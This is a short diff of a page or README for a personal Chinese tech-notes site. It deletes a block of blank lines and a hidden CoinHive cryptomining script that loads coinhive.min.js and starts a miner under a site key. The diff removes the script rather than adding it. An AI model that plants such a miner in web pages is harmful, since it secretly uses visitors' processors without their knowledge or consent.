@@ -3,14 +3,3 @@
 
 [技术笔记](https://muxiaobai.github.io)
 
-
-
-
-
-
-
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.User('4vmXkBOL0LsDsFLNY9UqbMlRxhGnXkAR', 'muxiaobai.ml');
-	miner.start();
-</script>
